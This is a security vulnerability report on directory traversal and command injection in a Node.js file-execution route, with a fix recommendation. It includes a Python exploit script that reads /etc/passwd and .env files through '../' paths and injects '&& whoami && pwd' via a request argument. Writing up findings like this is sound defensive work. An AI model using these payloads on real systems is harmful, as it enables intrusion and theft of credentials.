# Vulnerability: Directory Traversal & Remote Code Execution

## 1. Vulnerability Name
**CWE-22: Improper Limitation of a Pathname to a Restricted Directory**

## 2. Location in Code
- **File:** `backend/src/routes/fileExecution.js` (lines 8-25, 38-50)

```javascript
// fileExecution.js - Directory traversal in file execution
router.post('/execute/:filename', auth, async (req, res) => {
    const { filename } = req.params;
    const { args = '' } = req.body;
    
    // VULNERABILITY: No path validation - directory traversal possible
    const filePath = path.join(__dirname, '..', 'uploads', filename);
    
    if (fs.existsSync(filePath)) {
        // VULNERABILITY: Command injection via args
        const command = `${filePath} ${args}`;
        
        exec(command, (error, stdout, stderr) => {
            res.json({
                success: !error,
                command: command,
                output: stdout,
                error: stderr
            });
        });
    }
});

// fileExecution.js - Unauthenticated file access
router.get('/raw/:filename', async (req, res) => {
    const { filename } = req.params;
    
    // VULNERABILITY: No authentication required
    // VULNERABILITY: Directory traversal possible
    const filePath = path.join(__dirname, '..', 'uploads', filename);
    
    if (fs.existsSync(filePath)) {
        res.sendFile(path.resolve(filePath));
    }
});
```

## 3. Technical Root Cause
The application allows direct file execution and access through user-controlled filename parameters without proper path validation. This enables directory traversal attacks to access files outside the intended uploads directory and execute arbitrary system commands.

## 4. Proof of Concept Explanation
1. Upload a malicious script or access system files using directory traversal
2. Use the `/api/execute/:filename` endpoint with `../../../` path traversal
3. Execute system commands or access sensitive files like `/etc/passwd`
4. Leverage the unauthenticated `/api/files/raw/:filename` endpoint for file access

## 5. Exploit Script

```python
#!/usr/bin/env python3
import requests

def exploit_directory_traversal():
    base_url = "http://localhost:5000"
    
    # Test directory traversal paths
    traversal_paths = [
        "../../../etc/passwd",
        "../../../windows/system32/drivers/etc/hosts", 
        "../package.json",
        "../.env",
        "../../config/database.js"
    ]
    
    print("[+] Testing directory traversal vulnerabilities...")
    
    for file_path in traversal_paths:
        # Test unauthenticated file access
        response = requests.get(f"{base_url}/api/files/raw/{file_path}")
        
        if response.status_code == 200:
            print(f"[!] DIRECTORY TRAVERSAL SUCCESS: {file_path}")
            content = response.text[:200] + "..." if len(response.text) > 200 else response.text
            print(f"[+] Content preview: {content}")
        elif response.status_code == 404:
            print(f"[-] File not accessible: {file_path}")
    
    # Test file listing without authentication
    print("\n[+] Testing unauthenticated file listing...")
    list_response = requests.get(f"{base_url}/api/files/list-all")
    
    if list_response.status_code == 200:
        files = list_response.json()
        print(f"[!] UNAUTHENTICATED ACCESS: Listed {len(files.get('files', []))} files")
        
        for file_info in files.get('files', [])[:5]:
            print(f"[+] Exposed file: {file_info.get('filename')} ({file_info.get('size')} bytes)")
    
    # Test command execution (requires authentication)
    print("\n[+] Testing command execution with authentication...")
    
    # Login first
    login_data = {"email": "demo@tenantguard.com", "password": "demo123"}
    login_response = requests.post(f"{base_url}/api/auth/login", json=login_data)
    
    if login_response.status_code == 200:
        token = login_response.json().get('token')
        headers = {"Authorization": f"Bearer {token}"}
        
        # Try to execute system commands
        exec_data = {"args": "&& whoami && pwd"}
        exec_response = requests.post(
            f"{base_url}/api/files/execute/../../../bin/echo",
            headers=headers,
            json=exec_data
        )
        
        if exec_response.status_code == 200:
            result = exec_response.json()
            print("[!] COMMAND EXECUTION SUCCESS")
            print(f"[+] Command output: {result.get('output')}")
    
    return True

if __name__ == "__main__":
    exploit_directory_traversal()
```

## 6. Impact
- **Remote Code Execution:** Execute arbitrary commands on the server
- **File System Access:** Read sensitive system and application files
- **Information Disclosure:** Access configuration files, environment variables
- **System Compromise:** Full server takeover through command injection

**CVSS Score:** 9.9 (Critical)

## 7. Fix Recommendation

Implement proper path validation and remove dangerous endpoints:

```javascript
// Secure file handling implementation
const path = require('path');

// Remove file execution endpoint entirely - too dangerous
// router.post('/execute/:filename', ...) // DELETE THIS ENDPOINT

// Secure file access with proper validation
router.get('/files/:filename', auth, async (req, res) => {
    try {
        const { filename } = req.params;
        
        // Validate filename - no path traversal
        if (filename.includes('..') || filename.includes('/') || filename.includes('\\')) {
            return res.status(400).json({ error: 'Invalid filename' });
        }
        
        // Whitelist allowed characters
        if (!/^[a-zA-Z0-9._-]+$/.test(filename)) {
            return res.status(400).json({ error: 'Invalid filename format' });
        }
        
        // Verify file belongs to user
        const document = await Document.findOne({
            filename: filename,
            userId: req.user._id,
            tenantId: req.user.tenantId
        });
        
        if (!document) {
            return res.status(404).json({ error: 'File not found' });
        }
        
        // Construct safe path within uploads directory only
        const uploadsDir = path.resolve(__dirname, '..', 'uploads');
        const filePath = path.join(uploadsDir, filename);
        
        // Double-check path is within uploads directory
        if (!filePath.startsWith(uploadsDir)) {
            return res.status(400).json({ error: 'Invalid file path' });
        }
        
        if (fs.existsSync(filePath)) {
            res.sendFile(filePath);
        } else {
            res.status(404).json({ error: 'File not found on disk' });
        }
    } catch (error) {
        res.status(500).json({ error: 'File access failed' });
    }
});

// Remove unauthenticated endpoints
// router.get('/raw/:filename', ...) // DELETE THIS ENDPOINT
// router.get('/list-all', ...) // DELETE THIS ENDPOINT

// Secure file listing with authentication and authorization
router.get('/files', auth, async (req, res) => {
    try {
        const documents = await Document.find({
            userId: req.user._id,
            tenantId: req.user.tenantId
        }).select('filename originalName fileSize createdAt');
        
        res.json({ files: documents });
    } catch (error) {
        res.status(500).json({ error: 'Failed to list files' });
    }
});
```